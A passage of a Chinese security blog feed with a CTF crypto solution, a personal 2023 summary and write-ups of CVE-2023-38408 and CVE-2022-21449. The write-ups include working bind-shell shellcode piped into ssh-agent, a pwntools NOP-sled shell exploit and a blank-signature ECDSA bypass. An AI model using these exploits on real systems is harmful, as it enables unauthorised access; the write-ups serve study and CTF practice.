class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random, os</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randrange</span><br><span class="line">flag=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">x = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_key</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        q = getPrime(<span class="number">160</span>)</span><br><span class="line">        p = <span class="number">2</span> * getPrime(<span class="number">1024</span>-<span class="number">160</span>) * q+<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> isPrime(p):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    h = random.randint(<span class="number">1</span>, p - <span class="number">1</span>)</span><br><span class="line">    g = powmod(h,(p-<span class="number">1</span>)//q, p)</span><br><span class="line">    y=<span class="built_in">pow</span>(g,x,p)</span><br><span class="line">    <span class="keyword">return</span> p,q,g,y</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cry</span>():</span><br><span class="line">    a =</span><br><span class="line">    p = getPrime(<span class="number">512</span>)</span><br><span class="line">    q = getPrime(<span class="number">512</span>)</span><br><span class="line">    d = getPrime(<span class="number">280</span>)</span><br><span class="line">    n = p * q</span><br><span class="line">    e = inverse(d, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">    c = <span class="built_in">pow</span>(a, e, n)</span><br><span class="line">    <span class="keyword">return</span> n,e,c</span><br><span class="line"></span><br><span class="line">p,q,g,y=gen_key()</span><br><span class="line">k1 = random.randint(<span class="number">1</span>, q-<span class="number">1</span>)</span><br><span class="line">h1 = bytes_to_long(sha1(os.urandom(<span class="number">20</span>)).digest())</span><br><span class="line">r1 = <span class="built_in">pow</span>(g, k1, p) % q</span><br><span class="line">s1 = ((h1 + x*r1) * invert(k1, q))% q</span><br><span class="line"></span><br><span class="line">n,e,c= cry()</span><br><span class="line"></span><br><span class="line">a=</span><br><span class="line">b= <span class="number">17474742587088593627</span></span><br><span class="line">k2 = a*k1 + b</span><br><span class="line">h2 = bytes_to_long(sha1(os.urandom(<span class="number">20</span>)).digest())</span><br><span class="line">r2 = <span class="built_in">pow</span>(g, k2, p) % q</span><br><span class="line">s2 = ((h2 + x*r2) * invert(k2, q)) % q</span><br><span class="line"><span class="built_in">print</span>(n,e,c)</span><br><span class="line"><span class="built_in">print</span>(p,q,g,y)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;h1:%s r1:%s s1:%s&quot;</span>%(h1,r1,s1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;h2:%s r2:%s s2:%s&quot;</span>%(h2,r2,s2))</span><br></pre></td></tr></table></figure><p>题目嵌套了标准Boneh-Durfee attack 和线性DSA攻击。</p><p>由cry()函数得之用的RSA加密的a, 同时d较小，用标准Boneh-Durfee attack就能求出a。</p><p>接下来是求线性关系的步骤。已知：<br>$$<br>(h_1+xr_1)k^{-1}\equiv s_1\pmod q<br>(h_2+xr_2)(ak+b)^{-1}\equiv s_2\pmod q<br>$$<br>一通相消得：<br>$$<br>(s_1k-h_1)r_2-(s_2(ak+b)-h_2)r1\equiv0\pmod q<br>$$<br>可以求k。得到k再带入一个式子求x，也就是flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a =     <span class="comment">#Boneh-Durfee</span></span><br><span class="line">p= <span class="number">161310487790785086482919800040790794252181955976860261806376528825054571226885460699399582301663712128659872558133023114896223014064381772944582265101778076462675402208451386747128794418362648706087358197370036248544508513485401475977401111270352593919906650855268709958151310928767086591887892397722958234379</span></span><br><span class="line">q= <span class="number">1115861146902610160756777713087325311747309309771</span></span><br><span class="line">g= <span class="number">61073566757714587321114447684333928353300944355112378054603585955730395524359123615359185275743626350773632555967063692889668342544616165017003197599818881844811647270423070958521148291118914198811187731689123176313367399492561288350530256722898205674043032421874788802819858438796795768177550638273020791962</span></span><br><span class="line">y= <span class="number">23678147495254433946472657196764372220306841739888385605070426528738230369489739339976134564575544246606937803367113623097260181789372915552172469427842482448570540429192377881186772226796452797182435452490307834205012154495575570994963829345053331967442452842152258650027916313982835119514473311305158299360</span></span><br><span class="line">(h1, r1, s1) = <span class="number">535874494834828755542711401117152397489711233142</span>, <span class="number">117859946800380767356190121030392492081340616512</span>, <span class="number">26966646740134065096660259687229179143947213779</span></span><br><span class="line">(h2, r2, s2) = <span class="number">236574518096866758760287021848258048065293279716</span>, <span class="number">863199000523521111517835459866422731857447792677</span>, <span class="number">517924607931342012033031470185302567344725962419</span></span><br><span class="line"></span><br><span class="line">b = <span class="number">17474742587088593627</span></span><br><span class="line"></span><br><span class="line">k = (h1*r2-h2*r1 + b*s2*r1)*inverse(s1*r2-a*s2*r1,q) % q</span><br><span class="line">x = (k*s1 - h1)*inverse(r1,q) % q</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(x))</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h1 id=&quot;0x1-Not-Wiener&quot;&gt;&lt;a href=&quot;#0x1-Not-Wiener&quot; class=&quot;headerlink&quot; title=&quot;0x1 Not Wiener&quot;&gt;&lt;</summary>
      
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2023-Summary</title>
    <link href="http://example.com/2023/12/31/2023-Summary/"/>
    <id>http://example.com/2023/12/31/2023-Summary/</id>
    <published>2023-12-31T15:53:25.000Z</published>
    <updated>2023-12-31T17:31:48.711Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><p>大二下一堆课，学的是依托💩。大三上爽，课少，有更多时间摸鱼。</p><p>送别大四两位毕业的学长师傅。</p><blockquote><p>长亭外，古道边，芳草碧连天<br>晚风拂柳笛声残，夕阳山外山</p><p>天之涯，地之角，知交半零落<br>一瓢浊酒尽余欢，今宵别梦寒</p></blockquote><p>看的书：</p><ul><li><p>《科幻世界》一本没落下，补完了。现在感觉国内中短篇科幻写的就是依托，就连《依尘》这种堆砌文藻、数学公式显得自己很牛逼的东西都端上来了。</p><blockquote><p>不过SFW科幻大会很过瘾，大刘很和蔼一老头，乐呵呵给我签名。</p><p>王诺诺好看捏（抬走） </p></blockquote></li><li><p>《战争与和平》：读到三四百页鸽了，过了一段时间从头读。我就喜欢这味！仿佛身临其境体会人物的喜怒哀乐，一言一行。字里行间更是金句频出。</p><blockquote><p>此生必去一趟俄罗斯，还愿。</p></blockquote></li><li><p>一些论文：就不一一贴了，有的看完有的鸽了，笔记也记的稀稀拉拉，太懒了。</p></li><li><p>技术方面：《Go 语言编程之旅：一起用 Go 做项目》非常好Go，让我的代码力提升。基于这本书和阿鲁师傅的提点，给我出题提供了灵感和技术支撑；《<em>Learn You a Haskell</em>》，用公式写程序，非常优雅上流。</p></li></ul><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">quicksort</span> :: (<span class="type">Ord</span> a) =&gt; [a] -&gt; [a]  </span><br><span class="line"><span class="title">quicksort</span> [] = []  </span><br><span class="line"><span class="title">quicksort</span> (x:xs) =   </span><br><span class="line">    <span class="keyword">let</span> smallerSorted = quicksort [a | a &lt;- xs, a &lt;= x]  </span><br><span class="line">        biggerSorted = quicksort [a | a &lt;- xs, a &gt; x]  </span><br><span class="line">    <span class="keyword">in</span>  smallerSorted ++ [x] ++ biggerSorted  </span><br></pre></td></tr></table></figure><p>走的地方：</p><ul><li>成都：大本营，基本就是学校（学校里寝室-教室-实验室三点一线），经常和群友到北街恰饭，开发了不少好地方。平安SRC讲座+晚宴，讲座都是二进制的东西，挖浏览器的洞太帅了（），其他看不懂（），晚宴丰盛捏。加了长亭的大佬v，问有无内推，答最近没hc。安全行业愁云惨淡。</li><li>北京：去耍的，逛航博。想把阿鲁约出来吃饭，犬安大哥不待见兄弟😭。路上误打误撞闯入奇安信老窝，正值护网阶段，门口四个佬聊技术，给🐭🐭听的一愣一愣的。</li><li>深圳：补天白帽大会。讲座请了y4讲字节码，另外还有山大女博士讲安卓提权，忘了谁讲的开发交互式的二进制漏洞挖掘工具。我带着迷茫去深圳，带着思考、收获、信心回来。</li><li>哈尔滨：哈工大真大，计算机学院有独立的楼，把🐭🐭震惊到了。市区俄味很浓。</li><li>沈阳：到沈阳大街，做大保健。</li><li>丹东：隔着鸭绿江，眺望光之国。</li><li>重庆：父母游母校拉上🐭🐭的。</li></ul><p>我时常回忆起22年打鹏程杯的那个夏天，那时我们打车去赛场，阳光正好，我们满怀对未来的憧憬。如今人走人留，有失有得，让我每每回想无语凝噎。而<strong>2023年</strong>，就像一个长长的假期，上半年紧张的放假，下半年悠闲的放假。我走了很多地方，但真正留在我心底的美景就那么几个；认识了很多人，也因为自身或外部原因与他们断了联系；参与了很多事情，有些搞的好，不过好多还是没搞好。在迷茫中挣扎求变，上下求索就是我2023的最好画像。</p><p>就这样吧，希望<strong>2024</strong>变得更好。</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401010131505.png" alt="image-20240101013133418"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;p&gt;大二下一堆课，学的是依托💩。大三上爽，课少，有更多时间摸鱼。&lt;/p&gt;
&lt;p&gt;送别大四两位毕业的学长师傅。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;长亭外，古道边，芳草碧连天&lt;br</summary>
      
    
    
    
    
    <category term="other" scheme="http://example.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2023-38408-Brief-analysis</title>
    <link href="http://example.com/2023/12/27/CVE-2023-38408-Brief-analysis/"/>
    <id>http://example.com/2023/12/27/CVE-2023-38408-Brief-analysis/</id>
    <published>2023-12-27T15:56:20.000Z</published>
    <updated>2024-01-27T01:27:57.410Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><p><img src="https://iototsecnews.files.wordpress.com/2023/07/openssh.png?w=1008" alt="img"></p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>SSH（Secure Shell）是一种加密的网络传输协议。主要用来在客户端和服务器之间建立安全通信隧道。使用SSH进行远程登录，信息传输是加密的，即使信息被中途截获也不会泄露。OpenSSH软件套件负责SSH协议的实现。</p><p>23年七月爆出来OpenSSH(9.3p2版本以前)的一个CVE，用户使用 SSH-Agent 代理转发功能连接攻击者恶意服务器时，由于 SSH-Agent 未对加载的共享库进行限制，攻击者可通过将恶意共享库作为参数传递给 SSH-Agent 并通过其调用 dlopen&#x2F;dlclose 函数加载 &#x2F; 卸载位于用户客户端主机的共享库，实现远程代码执行。</p><p>攻击流程如图：</p><p><img src="https://github.com/LucasPDiniz/CVE-2023-38408/raw/main/img/poc.JPG" alt="img"></p><ul><li>攻击者通过SSH连接到服务器</li><li>Alice也通过SSH连接到服务器，此时Alice使用SSH转发代理连接到攻击者。</li><li>攻击者创建shellcode, 通过ssh进程发送给目标服务器</li><li>shellcode利用ssh-agent的PKCS#11漏洞创建一个新进程，劫持Alice的ssh访问权限</li><li>成功执行该攻击后，攻击者可能会访问绑定shell（shell代码），该shell可以使用netcat进行访问。</li></ul><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>目标：提升redqueenrebel权限，损害alice账户</p><p>机器：</p><ul><li>workstation: 受害者机器</li><li>kali 攻击者机器</li></ul><p>用户：</p><ul><li>redqueenrebel: 非特权用户</li><li>alice: workstation的root用户</li><li>root: hacker</li></ul><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>首先我们已经完成攻击的第一、二步，也即两个用户已经有权通过SSH访问服务器。</p><ol><li><p>获取在远程攻击者计算机上运行的 SSH 代理的 PID ，并导出到环境变量。我们还通过 ssh-add 添加了文件 linuxx64.elf.stub（UEFI 引导存根）</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> /tmp/ssh-*/agent.*</span><br><span class="line"><span class="built_in">export</span> SSH_AUTH_SOCK=/tmp/ssh-NqLP6il36s/agent.3452</span><br><span class="line">ssh-add -s /usr/lib/systemd/boot/efi/linuxx64.elf.stub</span><br></pre></td></tr></table></figure></li></ol><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401042335331.png" alt="image-20240104233548210"></p><ol start="2"><li><p>通过SSH把 shellcode复制到进程中</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SHELLCODE=$<span class="string">&#x27;\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0\x4d\x31\xd2\x41\x52\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x7a\x69\x48\x89\xe6\x41\x50\x5f\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x41\x50\x5f\x6a\x01\x5e\x6a\x32\x58\x0f\x05\x48\x89\xe6\x48\x31\xc9\xb1\x10\x51\x48\x89\xe2\x41\x50\x5f\x6a\x2b\x58\x0f\x05\x59\x4d\x31\xc9\x49\x89\xc1\x4c\x89\xcf\x48\x31\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05&#x27;</span></span><br><span class="line">(perl -e <span class="string">&#x27;print &quot;\0\0\x27\xbf\x14\0\0\0\x10/usr/lib/modules\0\0\x27\xa6&quot; . &quot;\x90&quot; x 10000&#x27;</span>; <span class="built_in">echo</span> -n <span class="string">&quot;<span class="variable">$SHELLCODE</span>&quot;</span>) | nc -U <span class="string">&quot;<span class="variable">$SSH_AUTH_SOCK</span>&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><p>一旦 shellcode 成功放入代理内存中，直接按CtrlC，停止 netcat 传输。</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401042337741.png" alt="image-20240104233746664"></p><ol start="3"><li><p>通过ssh-add上传：ibttcn3-rt2-dynamic.so、libKF5SonnetUi.so.5.92.0 和 libns3.35-wave.so.0.0.0，触发<strong>SIGSEGV</strong>漏洞。</p><blockquote><p><code>SIGSEGV</code> 是Linux和类Unix系统中的一个信号，它表示”Segmentation Fault”（分段错误）。当一个程序尝试访问未分配给它的内存区域，或者访问已经被释放的内存区域，就会触发 <code>SIGSEGV</code> 信号。收到 SIGSEGV 信号后，内核会识别出发生了无效内存访问，并继续调用自定义信号处理程序，而不是突然终止程序。此时攻击者会操纵程序的执行，并将其引导至位于 NOP 雪橇内的注入恶意代码。</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ssh-add -s /usr/lib/titan/libttcn3-rt2-dynamic.so</span><br><span class="line">[Enter <span class="keyword">for</span> passphrase]</span><br><span class="line">ssh-add -s /usr/lib/x86_64-linux-gnu/libKF5SonnetUi.so.5.92.0</span><br><span class="line">[Enter <span class="keyword">for</span> passphrase]</span><br><span class="line">ssh-add -s /usr/lib/x86_64-linux-gnu/libns3.35-wave.so.0.0.0</span><br><span class="line">[Enter <span class="keyword">for</span> passphrase]</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>成功提Alice的权，映射到端口31337上。</p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401042352811.png" alt="image-20240104235222726" style="zoom: 50%;" /></li></ol><h2 id="PS1-nop-sled"><a href="#PS1-nop-sled" class="headerlink" title="PS1 nop-sled"></a>PS1 nop-sled</h2><p>nop是一条不做任何操作的单指令，对应的十六进制编码为0x90。这里nop将被用作欺骗因子。通过创建一个大的NOP指令数组并将其放在shellcode之前，如果EIP返回到存储nop sled的任意地址，那么在达到shellcode之前，每执行一条nop指令，EIP都会递增。这就是说只要返回地址被nop sled中的某一地址所重写，EIP就会将sled滑向将正常执行的shellcode。<br>以一个简单程序的pwn解释：</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401052031291.png" alt="image-20240105203131190"></p><p>32位，canary保护开了，但没开NX和PIE，所以还是可以把shellcode写到栈上执行的。</p><p>反汇编main函数时报错：</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401052122346.png" alt="image-20240105212226312"></p><p>由于F5在分析调用时，未能成功解析参数位置&#x2F;参数个数，<br>解决方法：就是先undefine掉函数，在右键现在code,之后Creat function 就可以正常反编译了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">void</span> (*v5)(<span class="type">void</span>); <span class="comment">// [esp+0h] [ebp-1010h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> seed; <span class="comment">// [esp+4h] [ebp-100Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v7; <span class="comment">// [esp+1004h] [ebp-Ch]</span></span><br><span class="line">  <span class="type">int</span> *v8; <span class="comment">// [esp+1008h] [ebp-8h]</span></span><br><span class="line">  <span class="type">int</span> savedregs; <span class="comment">// [esp+1010h] [ebp+0h]</span></span><br><span class="line"></span><br><span class="line">  v8 = &amp;argc;</span><br><span class="line">  v7 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  logo();</span><br><span class="line">  srand((<span class="type">unsigned</span> <span class="type">int</span>)&amp;seed);</span><br><span class="line">  Loading();</span><br><span class="line">  acquire_satellites();</span><br><span class="line">  v3 = query_position();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;We need to load the ctfshow_flag.\nThe current location: %p\n&quot;</span>, v3);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What will you do?\n&gt; &quot;</span>);</span><br><span class="line">  fgets((<span class="type">char</span> *)&amp;seed, <span class="number">4096</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Where do you start?\n&gt; &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%p&quot;</span>, &amp;v5);</span><br><span class="line">  <span class="keyword">return</span> sub_8048A22(v5, (<span class="type">int</span>)&amp;savedregs);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>query_position函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">query_position</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1; <span class="comment">// [esp+3h] [ebp-15h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> &amp;v1 + rand() % <span class="number">1337</span> - <span class="number">668</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序执行逻辑是：</p><ul><li>输出栈中的地址</li><li>输入字符串赋给seed</li><li>输入地址赋给v5</li><li>使用v5()，从输入的地址，执行该地址的代码</li></ul><p>如果在栈中的某个位置填入大量nop指令再接上shellcode，随后控制程序的执行流从nop指令开始执行，则程序就会一直执行之前填入的nop，然后就是shellcode，从而成功pwn掉。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;i386&quot;</span></span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;xxxx&quot;</span>,<span class="string">&quot;xxxx&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;current location: &quot;</span>)</span><br><span class="line"><span class="comment"># 接收position</span></span><br><span class="line">addr = <span class="built_in">eval</span>(io.recvuntil(<span class="string">&quot;\n&quot;</span>,drop=<span class="literal">True</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(addr)</span><br><span class="line"><span class="comment"># \x90为nop指令</span></span><br><span class="line">payload = <span class="string">b&quot;\x90&quot;</span> * <span class="number">1336</span> + asm(shellcraft.sh())</span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment"># 输进v5的地址</span></span><br><span class="line">shell_addr = addr + <span class="number">0x2d</span> + <span class="number">668</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">hex</span>(shell_addr))</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401052351754.png" alt="image-20240105235100666"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;p&gt;&lt;img src=&quot;https://iototsecnews.files.wordpress.com/2023/07/openssh.png?w=1008&quot; alt=&quot;img&quot;&gt;&lt;</summary>
      
    
    
    
    
    <category term="vul" scheme="http://example.com/tags/vul/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2022-21449-Brief-analysis</title>
    <link href="http://example.com/2023/12/27/CVE-2022-21449-Brief-analysis/"/>
    <id>http://example.com/2023/12/27/CVE-2022-21449-Brief-analysis/</id>
    <published>2023-12-27T07:36:51.000Z</published>
    <updated>2023-12-27T07:39:44.514Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>ECDSA代表椭圆曲线数字签名算法，与旧的RSA签名相比，ECDSA签名长度更短，因此应用面较广，例如各种JWT场景。服务器使用java15~18版本的ECDSA，会受到攻击者绕过的影响。由于ECDSA未对提交的r和s值做仔细的检查，攻击者可通过将为0的r和s作为参数提交给服务器，实现绕过验签的过程。</p><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>JShell – 版本 15.0.2</p><h2 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">jshell&gt; <span class="keyword">import</span> java.security.*</span><br><span class="line"></span><br><span class="line">jshell&gt; <span class="type">var</span> <span class="variable">keys</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;EC&quot;</span>).generateKeyPair()</span><br><span class="line">keys ==&gt; java.security.KeyPair@63e31ee</span><br><span class="line"></span><br><span class="line">jshell&gt; <span class="type">var</span> <span class="variable">blankSignature</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">64</span>]</span><br><span class="line">blankSignature ==&gt; <span class="type">byte</span>[<span class="number">64</span>] &#123; <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, ... , <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span> &#125;</span><br><span class="line"></span><br><span class="line">jshell&gt; <span class="type">var</span> <span class="variable">sig</span> <span class="operator">=</span> Signature.getInstance(<span class="string">&quot;SHA256WithECDSAInP1363Format&quot;</span>)</span><br><span class="line">sig ==&gt; Signature object: SHA256WithECDSAInP1363Format&lt;not initialized&gt;</span><br><span class="line"></span><br><span class="line">jshell&gt; sig.initVerify(keys.getPublic())</span><br><span class="line"></span><br><span class="line">jshell&gt; sig.update(<span class="string">&quot;Hello, World&quot;</span>.getBytes())</span><br><span class="line"></span><br><span class="line">jshell&gt; sig.verify(blankSignature)</span><br><span class="line">$<span class="number">7</span> ==&gt; <span class="literal">true</span></span><br><span class="line"><span class="comment">// 成功绕过验签</span></span><br></pre></td></tr></table></figure><h2 id="技术细节"><a href="#技术细节" class="headerlink" title="技术细节"></a>技术细节</h2><p>ECDSA签名由两个值组成，称为r和s。验签需要检查的含有r, s, 公钥和消息的摘要值的方程。方程一侧是r, 另一侧包含r和s。因此如果r和s均为0，则方程结果是$0&#x3D;0\times \alpha(something)$, 从而方程成立，验签通过。</p><h2 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h2><p>jwt一般会对参数编码，故针对特定场景，需要构造不同的payload。</p><p>强网杯2022 <strong>myJWT</strong> :</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span 